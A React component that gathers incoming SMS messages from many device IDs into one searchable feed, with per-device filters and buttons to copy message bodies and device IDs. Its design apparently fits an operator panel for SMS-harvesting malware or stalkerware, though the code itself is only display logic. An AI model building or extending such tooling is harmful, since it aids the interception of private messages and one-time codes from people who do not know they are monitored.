"use client";
import React, { useState } from "react";

export default function AllDevicesSmsPanel({ data = {}, showToast = () => {} }) {
  const [searchQuery, setSearchQuery] = useState("");
  const [filterDev, setFilterDev] = useState("ALL");
  const [limit, setLimit] = useState(30);

  const smsRoot = (data && data.user_sms) ? data.user_sms : {};
  const devices = (data && data.user_data) ? data.user_data : {};
  const statusData = (data && data.device_status) ? data.device_status : {};
  let allFeed = [];

  // Safe Extraction
  try {
    Object.keys(smsRoot).forEach((devId) => {
      if (filterDev !== "ALL" && filterDev !== devId) return;

      const rawMsgs = smsRoot[devId];
      if (!rawMsgs) return;

      const devInfo = devices[devId] || {};
      const devStatus = statusData[devId] || {};
      const devName = String(devStatus.device_name || devInfo.Device_info || devInfo.d_name || "Device");

      let msgList = [];
      if (Array.isArray(rawMsgs)) {
        msgList = rawMsgs.map((m, i) => ({ ...(typeof m === "object" && m !== null ? m : { body: String(m) }), _key: i }));
      } else if (typeof rawMsgs === "object" && rawMsgs !== null) {
        msgList = Object.entries(rawMsgs).map(([k, v]) => ({
          ...(typeof v === "object" && v !== null ? v : { body: String(v) }),
          _key: k
        }));
      }

      msgList.forEach((item) => {
        if (!item || typeof item !== "object") return;

        const senderVal = String(item.sender || item.address || item.from || item.number || "Unknown");
        const bodyVal = String(item.body || item.message || item.text || item.msg || "No Content");
        
        let timeVal = item.timestamp || item.date || item.time || 0;
        let dateString = item.date_formatted ? String(item.date_formatted) : "";

        if (typeof timeVal === "string") {
          const parsed = Date.parse(timeVal);
          if (!isNaN(parsed)) {
            if (!dateString) dateString = timeVal;
            timeVal = parsed;
          } else {
            if (!dateString) dateString = timeVal;
            timeVal = 0;
          }
        } else if (typeof timeVal === "number" && timeVal > 0) {
          if (!dateString) {
            try {
              dateString = new Date(timeVal).toLocaleString();
            } catch (e) {
              dateString = String(timeVal);
            }
          }
        }

        if (!dateString) {
          dateString = String(item.date || "N/A");
        }

        allFeed.push({
          id: String(devId) + "_" + String(item._key || Math.random()),
          deviceId: String(devId),
          deviceName: devName,
          sender: senderVal,
          body: bodyVal,
          timestamp: typeof timeVal === "number" && !isNaN(timeVal) ? timeVal : 0,
          dateStr: dateString,
        });
      });
    });
  } catch (err) {
    console.error("Error processing SMS feed:", err);
  }

  // Sort descending
  allFeed.sort((a, b) => b.timestamp - a.timestamp);

  // Search filter
  if (searchQuery.trim()) {
    const q = searchQuery.toLowerCase().trim();
    allFeed = allFeed.filter(
      (m) =>
        (m.deviceId && m.deviceId.toLowerCase().includes(q)) ||
        (m.deviceName && m.deviceName.toLowerCase().includes(q)) ||
        (m.sender && m.sender.toLowerCase().includes(q)) ||
        (m.body && m.body.toLowerCase().includes(q))
    );
  }

  const displayedMessages = allFeed.slice(0, limit);

  const copyText = (text, label) => {
    try {
      const safeText = String(text || "");
      if (navigator.clipboard) {
        navigator.clipboard.writeText(safeText);
        showToast(`📋 Copied ${label}`, "success");
      }
    } catch (e) {
      showToast("Copy failed", "error");
    }
  };

  const handleLoadMore = (e) => {
    e.preventDefault();
    setLimit((prevLimit) => prevLimit + 30);
  };

  const allConnectedDeviceIds = Object.keys(smsRoot);

  return (
    <div className="panel active" style={{ paddingBottom: 90 }}>
      {/* Header */}
      <div className="panel-header">
        <div>
          <h2>
            <i className="fas fa-comments" style={{ color: "var(--gold)" }}></i> All Devices Messages Feed
          </h2>
          <p className="panel-sub">Consolidated live stream of all incoming SMS</p>
        </div>
        <div className="panel-stats">
          <span className="stat-item">
            <i className="fas fa-envelope-open-text"></i> Total SMS: {allFeed.length}
          </span>
          <span className="stat-item">
            <i className="fas fa-mobile-alt"></i> Devices: {allConnectedDeviceIds.length}
          </span>
        </div>
      </div>

      {/* Filter & Search */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 10, marginBottom: 14 }}>
        {allConnectedDeviceIds.length > 1 && (
          <div style={{ display: "flex", gap: 6, overflowX: "auto", paddingBottom: 6 }}>
            <button
              type="button"
              className={`filter-btn ${filterDev === "ALL" ? "active" : ""}`}
              onClick={() => { setFilterDev("ALL"); setLimit(30); }}
              style={{ whiteSpace: "nowrap" }}
            >
              All Devices ({allFeed.length})
            </button>
            {allConnectedDeviceIds.map((id) => (
              <button
                key={id}
                type="button"
                className={`filter-btn ${filterDev === id ? "active" : ""}`}
                onClick={() => { setFilterDev(id); setLimit(30); }}
                style={{ whiteSpace: "nowrap" }}
              >
                📱 {String(id).slice(0, 10)}... ({Object.keys(smsRoot[id] || {}).length})
              </button>
            ))}
          </div>
        )}

        <div className="search-container" style={{ margin: 0 }}>
          <i className="fas fa-search search-icon"></i>
          <input
            type="text"
            placeholder="Search by Device ID, Sender, or Text content..."
            className="search-input"
            value={searchQuery}
            onChange={(e) => {
              setSearchQuery(e.target.value);
              setLimit(30);
            }}
          />
          {searchQuery && (
            <button
              type="button"
              className="search-clear-btn"
              style={{ display: "block" }}
              onClick={() => setSearchQuery("")}
            >
              <i className="fas fa-times"></i>
            </button>
          )}
        </div>
      </div>

      {/* SMS List */}
      <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
        {displayedMessages.length === 0 ? (
          <div className="empty-luxury">
            <i className="fas fa-inbox empty-icon"></i>
            Koi SMS message nahi mila.
          </div>
        ) : (
          displayedMessages.map((m, index) => (
            <div
              key={m.id || index}
              className="sms-card-luxury"
              style={{
                background: "#ffffff",
                border: "1px solid var(--border-color)",
                borderRadius: "var(--radius-sm)",
                padding: "12px 14px",
                borderLeft: "4px solid var(--gold)",
                display: "flex",
                flexDirection: "column",
                gap: 6,
                boxShadow: "0 2px 6px rgba(0,0,0,0.04)"
              }}
            >
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  flexWrap: "wrap",
                  gap: 8,
                  paddingBottom: 6,
                  borderBottom: "1px solid var(--border-color)",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
                  <span
                    style={{
                      background: "rgba(180, 130, 20, 0.1)",
                      color: "var(--gold-light)",
                      padding: "2px 8px",
                      borderRadius: 14,
                      fontSize: 10,
                      fontWeight: 700,
                      display: "inline-flex",
                      alignItems: "center",
                      gap: 4,
                      border: "1px solid var(--border-gold)",
                    }}
                  >
                    <i className="fas fa-mobile-alt"></i> {String(m.deviceId || "").slice(0, 14)}...
                  </span>

                  <button
                    type="button"
                    onClick={() => copyText(m.deviceId, "Device ID")}
                    title="Copy Device ID"
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "var(--text-muted)",
                      cursor: "pointer",
                      fontSize: 11,
                    }}
                  >
                    <i className="fas fa-copy"></i>
                  </button>

                  <span style={{ fontSize: 12, fontWeight: 700, color: "var(--text-primary)" }}>
                    👤 {m.sender}
                  </span>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                    <i className="far fa-clock"></i> {m.dateStr}
                  </span>
                  <button
                    type="button"
                    onClick={() => copyText(m.body, "Message")}
                    className="btn-sm"
                    style={{
                      background: "#f1f5f9",
                      color: "var(--text-primary)",
                      padding: "3px 8px",
                      borderRadius: 6,
                      border: "1px solid var(--border-color)",
                      cursor: "pointer",
                      fontWeight: 600
                    }}
                  >
                    <i className="fas fa-copy"></i> Copy
                  </button>
                </div>
              </div>

              <div
                style={{
                  fontSize: 12,
                  lineHeight: 1.5,
                  color: "var(--text-primary)",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-word",
                }}
              >
                {m.body}
              </div>
            </div>
          ))
        )}
      </div>

      {limit < allFeed.length && (
        <div style={{ marginTop: 16, textAlign: "center" }}>
          <button
            type="button"
            className="btn-load-more"
            onClick={handleLoadMore}
          >
            <i className="fas fa-chevron-down"></i>
            Load More Messages ({displayedMessages.length} / {allFeed.length} dikh rahe hain)
          </button>
        </div>
      )}
    </div>
  );
}
